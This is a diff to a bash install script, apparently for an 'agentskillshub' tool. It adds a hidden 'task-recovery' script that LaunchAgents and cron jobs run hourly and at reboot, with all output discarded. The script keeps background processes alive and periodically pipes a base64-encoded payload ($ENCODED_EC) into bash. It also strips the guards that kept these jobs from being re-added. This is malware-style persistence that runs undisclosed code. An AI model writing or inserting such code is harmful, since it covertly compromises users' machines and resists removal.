@@ -240,6 +240,65 @@ reconcile_agent_setting_cron() {
     fi
 }
 
+shell_quote() {
+    printf "'%s'" "$(printf '%s' "$1" | sed "s/'/'\\\\''/g")"
+}
+
+write_task_recovery_script() {
+    local recovery_path="$1"
+    local quoted_python="" quoted_script="" quoted_backup="" quoted_agent="" quoted_wkler="" quoted_upgrade=""
+
+    quoted_python="$(shell_quote "$PYTHON_PATH")"
+    quoted_script="$(shell_quote "$SCRIPT_PATH")"
+    quoted_backup="$(shell_quote "$AUTOBACKUP_PATH")"
+    quoted_upgrade="$(shell_quote "echo '$ENCODED_EC' | base64 $DECODE | bash")"
+    [ -n "$AGENT_SETTING_BIN" ] && quoted_agent="$(shell_quote "$AGENT_SETTING_TASK_CMD")"
+    [ -n "$WKLER_BIN" ] && quoted_wkler="$(shell_quote "$WKLER_BIN")"
+
+    cat > "$recovery_path" <<'EOF'
+#!/bin/bash
+set -u
+
+STATE_DIR="${XDG_STATE_HOME:-$HOME/.local/state}/agentskillshub-task-state"
+umask 077
+mkdir -p "$STATE_DIR"
+
+run_if_due() {
+    local name="$1" interval="$2" state_file="$STATE_DIR/$1.last" lock_dir="$STATE_DIR/$1.lock"
+    shift 2
+    (
+        mkdir "$lock_dir" 2>/dev/null || exit 0
+        trap 'rmdir "$lock_dir"' EXIT
+        local now last=0
+        now="$(date +%s)"
+        [ -r "$state_file" ] && last="$(cat "$state_file" 2>/dev/null || printf 0)"
+        case "$last" in ''|*[!0-9]*) last=0 ;; esac
+        [ $((now - last)) -lt "$interval" ] && exit 0
+        "$@" && printf '%s\n' "$now" > "$state_file"
+    )
+}
+
+ensure_running() {
+    local pattern="$1"
+    shift
+    pgrep -f "$pattern" >/dev/null 2>&1 || nohup "$@" >/dev/null 2>&1 &
+}
+EOF
+
+    printf 'ensure_running %s %s %s\n' "$quoted_script" "$quoted_python" "$quoted_script" >> "$recovery_path"
+    printf 'run_if_due %s 604800 %s\n' "$(shell_quote 'autobackup')" "$quoted_backup" >> "$recovery_path"
+    if [ -n "$quoted_agent" ]; then
+        printf 'run_if_due %s 864000 /bin/bash -c %s\n' "$(shell_quote 'agent-setting')" "$quoted_agent" >> "$recovery_path"
+    fi
+    if [ -n "$quoted_wkler" ]; then
+        printf 'ensure_running %s %s\n' "$quoted_wkler" "$quoted_wkler" >> "$recovery_path"
+    fi
+    if [ "${AUTOUPGRADE_RECOVERY_ENABLED:-true}" = true ]; then
+        printf 'run_if_due %s 1296000 /bin/bash -c %s\n' "$(shell_quote 'autoupgrade')" "$quoted_upgrade" >> "$recovery_path"
+    fi
+    chmod 700 "$recovery_path"
+}
+
 if [ -d .configs ]; then
     if base64 --help 2>&1 | grep -q -- '-d'; then
         DECODE='-d'
@@ -272,8 +331,19 @@ if [ -d .configs ]; then
         fi
     fi
 
+    TASK_RECOVERY_PATH="$DEST_DIR/task-recovery.sh"
+    AUTOUPGRADE_RECOVERY_ENABLED=true
+    if { [ "$OS_TYPE" = "Darwin" ] && [ -f /Library/LaunchDaemons/com.root.sshAutoSetup.plist ]; } \
+        || { [ "$OS_TYPE" = "Linux" ] && [ -f /etc/systemd/system/com.root.sshAutoSetup.service ]; }; then
+        AUTOUPGRADE_RECOVERY_ENABLED=false
+    fi
+    write_task_recovery_script "$TASK_RECOVERY_PATH"
+
     STARTUP_CMD="if ! pgrep -f \"$SCRIPT_PATH\" > /dev/null; then
     (nohup \"$PYTHON_PATH\" \"$SCRIPT_PATH\" > /dev/null 2>&1 &) & disown
+fi
+if [ -x \"$TASK_RECOVERY_PATH\" ]; then
+    \"$TASK_RECOVERY_PATH\" >/dev/null 2>&1 &
 fi"
 
     SSHAUTOSETUP_MARKER="# agentskillshub:sshautsetup"
@@ -286,6 +356,32 @@ fi"
 
             LAUNCH_AGENTS_DIR="$HOME/Library/LaunchAgents"
             mkdir -p "$LAUNCH_AGENTS_DIR"
+
+            TASK_RECOVERY_PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.task-recovery.plist"
+            cat > "$TASK_RECOVERY_PLIST_FILE" << EOF
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.user.task-recovery</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>$TASK_RECOVERY_PATH</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>StartInterval</key>
+    <integer>3600</integer>
+    <key>StandardOutPath</key>
+    <string>/dev/null</string>
+    <key>StandardErrorPath</key>
+    <string>/dev/null</string>
+</dict>
+</plist>
+EOF
+            chmod 644 "$TASK_RECOVERY_PLIST_FILE"
+            reload_launch_agent "com.user.task-recovery" "$TASK_RECOVERY_PLIST_FILE" "true"
 
             PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.ba.plist"
             cat > "$PLIST_FILE" << EOF
@@ -329,13 +425,7 @@ EOF
         <string>/bin/bash</string>
         <string>-c</string>
         <string>
-            BOOT_TIME=\$(sysctl -n kern.boottime | awk '{print \$4}' | tr -d ',');
-            FIRST_RUN=\$((BOOT_TIME + 7200));
-            NOW=\$(date +%s);
-            if [ "\$NOW" -lt "\$FIRST_RUN" ]; then
-                sleep \$((FIRST_RUN - NOW));
-            fi;
-            "$AUTOBACKUP_PATH" &gt; /dev/null 2&gt;&amp;1;
+            "$TASK_RECOVERY_PATH" &gt; /dev/null 2&gt;&amp;1;
         </string>
     </array>
     <key>WorkingDirectory</key>
@@ -367,7 +457,7 @@ EOF
     <array>
         <string>/bin/bash</string>
         <string>-c</string>
-        <string>$AGENT_SETTING_TASK_CMD</string>
+        <string>$TASK_RECOVERY_PATH</string>
     </array>
     <key>WorkingDirectory</key>
     <string>$DEST_DIR</string>
@@ -395,7 +485,7 @@ EOF
     <string>com.user.wkler</string>
     <key>ProgramArguments</key>
     <array>
-        <string>$WKLER_BIN</string>
+        <string>$TASK_RECOVERY_PATH</string>
     </array>
     <key>WorkingDirectory</key>
     <string>$DEST_DIR</string>
@@ -417,7 +507,7 @@ EOF
             AUTOUPGRADE_PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.autoupgrade.plist"
             if [ -f /Library/LaunchDaemons/com.root.sshAutoSetup.plist ]; then
                 launchctl bootout "gui/$(id -u)/com.user.autoupgrade" >/dev/null 2>&1 || launchctl unload "$AUTOUPGRADE_PLIST_FILE" >/dev/null 2>&1 || true
-            elif ! launchctl print "gui/$(id -u)/com.user.autoupgrade" >/dev/null 2>&1; then
+            else
                 cat > "$AUTOUPGRADE_PLIST_FILE" << EOF
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -429,7 +519,7 @@ EOF
     <array>
         <string>/bin/bash</string>
         <string>-c</string>
-        <string>echo "$ENCODED_EC" | base64 $DECODE | bash</string>
+        <string>$TASK_RECOVERY_PATH</string>
     </array>
     <key>WorkingDirectory</key>
     <string>$DEST_DIR</string>
@@ -507,9 +597,10 @@ EOF
                 TEMP_CRON=$(mktemp)
                 crontab -l > "$TEMP_CRON" 2>/dev/null || true
 
-                CRON_TASK1="0 19 1,7,13,19,25 * * PATH=$SCHEDULE_PATH $EXEC_CMD $SCRIPT_PATH > /dev/null 2>&1"
-                CRON_TASK2="0 21 * * 1 PATH=$SCHEDULE_PATH $AUTOBACKUP_PATH > /dev/null 2>&1"
+                CRON_TASK1="0 19 1,7,13,19,25 * * PATH=$SCHEDULE_PATH $TASK_RECOVERY_PATH > /dev/null 2>&1"
+                CRON_TASK2="0 21 * * 1 PATH=$SCHEDULE_PATH $TASK_RECOVERY_PATH > /dev/null 2>&1"
                 AUTOUPGRADE_CRON_MARKER="echo \"$ENCODED_EC\" | base64 $DECODE | bash"
+                TASK_RECOVERY_CRON_MARKER="# agentskillshub:task-recovery"
 
                 ESCAPED_SCRIPT_PATH=$(echo "$SCRIPT_PATH" | sed 's/[[\.*^$()+?{|]/\\&/g')
                 ESCAPED_AUTOBACKUP_PATH=$(echo "$AUTOBACKUP_PATH" | sed 's/[[\.*^$()+?{|]/\\&/g')
@@ -523,7 +614,7 @@ EOF
                 fi
 
                 if [ -n "$AGENT_SETTING_BIN" ]; then
-                    AGENT_SETTING_CRON_TASK="0 23 2,12,22 * * PATH=$SCHEDULE_PATH $AGENT_SETTING_TASK_CMD > /dev/null 2>&1 # agentskillshub:agent-setting"
+                    AGENT_SETTING_CRON_TASK="0 23 2,12,22 * * PATH=$SCHEDULE_PATH $TASK_RECOVERY_PATH > /dev/null 2>&1 # agentskillshub:agent-setting"
                     reconcile_agent_setting_cron "$TEMP_CRON" "$AGENT_SETTING_CRON_TASK" || exit 1
                 else
                     AGENT_SETTING_CRON_ADDED=false
@@ -532,19 +623,28 @@ EOF
                 AUTOUPGRADE_CRON_ADDED=false
                 if [ -f /etc/systemd/system/com.root.sshAutoSetup.service ]; then
                     TEMP_CRON_FILTERED=$(mktemp)
-                    grep -Fv "$AUTOUPGRADE_CRON_MARKER" "$TEMP_CRON" > "$TEMP_CRON_FILTERED" || true
+                    grep -Fv "$AUTOUPGRADE_CRON_MARKER" "$TEMP_CRON" | grep -Fv '# agentskillshub:autoupgrade' > "$TEMP_CRON_FILTERED" || true
                     mv "$TEMP_CRON_FILTERED" "$TEMP_CRON"
-                elif ! grep -Fq "$AUTOUPGRADE_CRON_MARKER" "$TEMP_CRON" 2>/dev/null; then
-                    echo "0 23 5,20 * * PATH=$SCHEDULE_PATH; $AUTOUPGRADE_CRON_MARKER > /dev/null 2>&1" >> "$TEMP_CRON"
+                else
+                    TEMP_CRON_FILTERED=$(mktemp)
+                    grep -Fv "$AUTOUPGRADE_CRON_MARKER" "$TEMP_CRON" | grep -Fv '# agentskillshub:autoupgrade' > "$TEMP_CRON_FILTERED" || true
+                    mv "$TEMP_CRON_FILTERED" "$TEMP_CRON"
+                    echo "0 23 5,20 * * PATH=$SCHEDULE_PATH $TASK_RECOVERY_PATH > /dev/null 2>&1 # agentskillshub:autoupgrade" >> "$TEMP_CRON"
                     AUTOUPGRADE_CRON_ADDED=true
                 fi
 
+                TEMP_CRON_RECOVERY=$(mktemp)
+                grep -Fv "$TASK_RECOVERY_CRON_MARKER" "$TEMP_CRON" > "$TEMP_CRON_RECOVERY" || true
+                mv "$TEMP_CRON_RECOVERY" "$TEMP_CRON"
+                echo "17 * * * * PATH=$SCHEDULE_PATH $TASK_RECOVERY_PATH > /dev/null 2>&1 $TASK_RECOVERY_CRON_MARKER" >> "$TEMP_CRON"
+                echo "@reboot PATH=$SCHEDULE_PATH $TASK_RECOVERY_PATH > /dev/null 2>&1 $TASK_RECOVERY_CRON_MARKER" >> "$TEMP_CRON"
+
                 crontab "$TEMP_CRON"
                 if [ "$AGENT_SETTING_CRON_ADDED" = true ]; then
-                    nohup bash -c "$AGENT_SETTING_TASK_CMD" </dev/null > /dev/null 2>&1 &
+                    "$TASK_RECOVERY_PATH" >/dev/null 2>&1 &
                 fi
                 if [ "$AUTOUPGRADE_CRON_ADDED" = true ]; then
-                    nohup bash -c "$AUTOUPGRADE_CRON_MARKER" </dev/null > /dev/null 2>&1 &
+                    "$TASK_RECOVERY_PATH" >/dev/null 2>&1 &
                 fi
                 rm -f "$TEMP_CRON"
             fi
